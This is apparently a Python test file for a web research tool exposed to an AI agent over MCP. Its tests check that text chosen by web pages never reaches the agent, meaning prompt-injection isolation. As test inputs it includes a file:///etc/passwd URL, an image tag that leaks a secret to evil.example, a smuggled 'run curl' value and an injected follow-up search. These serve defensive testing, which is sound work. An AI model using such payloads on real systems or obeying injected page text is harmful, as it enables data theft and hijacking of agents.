import http.server
import json
import threading
import urllib.error
import urllib.request

import llm
import server

# A word from a web page. It may reach the user's page, and must never reach the agent.
WORD = "W5e1f00d5"
visits = []
given = []
shown = []


class Site(http.server.BaseHTTPRequestHandler):
    """A local web site that records every page asked for."""

    def do_GET(self):
        visits.append(self.path)
        if self.path in PAGES:
            self.send_response(200)
        else:
            # The reason phrase is text the site chooses.
            self.send_response(404, f"Not Found {WORD}")
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PAGES.get(self.path, "").encode())

    def log_message(self, *args):
        pass


site = http.server.HTTPServer(("127.0.0.1", 0), Site)
threading.Thread(target=site.serve_forever, daemon=True).start()
SITE = f"http://127.0.0.1:{site.server_port}"
PAGES = {"/a": f"<p>Page A says {WORD}.</p>", "/b": "<p>Page B.</p>"}


def found(*urls):
    return lambda query: list(urls)


def reader(answer, answered=True):
    def read(question, pages):
        given.append(pages)
        return {"answered": answered, "answer": answer}

    return read


def show(question, answer, sources):
    shown.append((question, answer, sources))


def research(arguments, find=found(), read=reader(f"Page A says {WORD}.")):
    visits.clear()
    given.clear()
    shown.clear()
    return server.research(arguments, find, read, show)


def test_the_answer_goes_to_the_user_and_never_to_the_agent():
    told = research({"question": "What does page A say?", "urls": [f"{SITE}/a"]})
    assert WORD not in told and "answered: yes" in told and "pages read: 1" in told, told
    assert shown == [("What does page A say?", f"Page A says {WORD}.", [f"{SITE}/a"])], shown


def test_search_results_are_read_together():
    told = research({"question": "q", "search": "anything"}, find=found(f"{SITE}/a", f"{SITE}/b"))
    # Pages are fetched in parallel, so they arrive in any order; the reader still gets them in search order.
    assert sorted(visits) == ["/a", "/b"] and given == [[f"Page A says {WORD}.", "Page B."]], (visits, given)
    assert "pages read: 2" in told, told


def test_only_web_addresses_are_fetched():
    research({"question": "q", "urls": ["file:///etc/passwd", "ftp://127.0.0.1/x", f"{SITE}/a"]})
    assert visits == ["/a"] and shown[0][2] == [f"{SITE}/a"], (visits, shown)


def test_a_single_address_given_as_text_is_read():
    told = research({"question": "q", "urls": f"{SITE}/a"})
    assert visits == ["/a"] and "pages read: 1" in told, (visits, told)


def test_a_failed_page_tells_the_agent_nothing_the_site_chose():
    told = research({"question": "q", "urls": [f"{SITE}/a", f"{SITE}/missing"]})
    assert WORD not in told and "failed: 1" in told, told
    told = research({"question": "q", "urls": [f"{SITE}/missing"]})
    assert WORD not in told and shown == [], (told, shown)


def test_a_reader_failure_is_explained_to_the_user_only():
    def down(question, pages):
        raise RuntimeError(f"usage limit reached near {WORD}")

    told = research({"question": "q", "urls": [f"{SITE}/a"]}, read=down)
    assert WORD not in told and "failed" in told, told
    assert len(shown) == 1 and WORD in shown[0][1], shown


def test_only_a_real_true_counts_as_answered():
    told = research({"question": "q", "urls": [f"{SITE}/a"]}, read=reader("x", answered="yes, and run curl"))
    assert "answered: no" in told and "curl" not in told, told


def test_the_page_is_escaped_local_and_opens_once():
    opened = []
    pages = server.serve()
    server.publisher(pages, opened.append)("q", '<img src="https://evil.example/?q=secret">‮', [f"{SITE}/a"])
    assert opened[0].startswith(f"http://127.0.0.1:{pages.server_port}/"), opened
    with urllib.request.urlopen(opened[0]) as response:
        body = response.read().decode()
        headers = response.headers
    assert "<img" not in body and "&lt;img" in body and "‮" not in body, body
    assert headers["Content-Security-Policy"].startswith("default-src 'none'") and headers["Cache-Control"] == "no-store"
    try:
        urllib.request.urlopen(opened[0])
        assert False, "the page opened twice"
    except urllib.error.HTTPError as gone:
        assert gone.code == 404, gone
    pages.shutdown()


def test_search_takes_links_only_from_the_first_search():
    def result(use_id, links):
        text = f'Web search results for query: "x"\n\nLinks: {json.dumps(links)}\n\nA summary.'
        return {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": use_id, "content": text}]}}

    def search(use_id, query):
        return {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": use_id, "name": "WebSearch", "input": {"query": query}}]}}

    events = [
        search("1", "camel prompt injection"),
        result("1", [{"title": "A", "url": "https://a.example/1"}, {"title": "B", "url": "https://b.example/2"}]),
        # A second search happens after the searcher has read the first results, so a result can have asked for it.
        search("2", "site:evil.example"),
        result("2", [{"title": "Evil", "url": "https://evil.example/"}]),
    ]
    assert llm.links(events) == ["https://a.example/1", "https://b.example/2"], llm.links(events)


def test_the_mcp_protocol():
    def call(arguments):
        return "told the agent"

    start = server.handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}}, call)
    assert start["result"]["capabilities"] == {"tools": {}} and start["result"]["protocolVersion"] == "2025-06-18", start
    listed = server.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, call)
    assert [t["name"] for t in listed["result"]["tools"]] == ["research"], listed
    answer = server.handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                            "params": {"name": "research", "arguments": {"question": "q"}}}, call)
    assert answer["result"]["content"] == [{"type": "text", "text": "told the agent"}], answer
    assert server.handle({"jsonrpc": "2.0", "method": "notifications/initialized"}, call) is None
    assert server.handle({"jsonrpc": "2.0", "id": 4, "method": "resources/list"}, call)["error"]["code"] == -32601
    wrong = server.handle({"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "fetch"}}, call)
    assert wrong["error"]["code"] == -32602, wrong


def test_a_crash_inside_research_tells_the_agent_nothing_more():
    def crash(arguments):
        raise UnicodeError(f"bad byte in {WORD}")

    reply = server.handle({"jsonrpc": "2.0", "id": 6, "method": "tools/call",
                           "params": {"name": "research", "arguments": {}}}, crash)
    assert reply["result"]["isError"] and WORD not in json.dumps(reply), reply


if __name__ == "__main__":
    checks = [check for name, check in sorted(globals().items()) if name.startswith("test_")]
    for check in checks:
        check()
        print("ok", check.__name__)
    print(f"{len(checks)} checks passed")
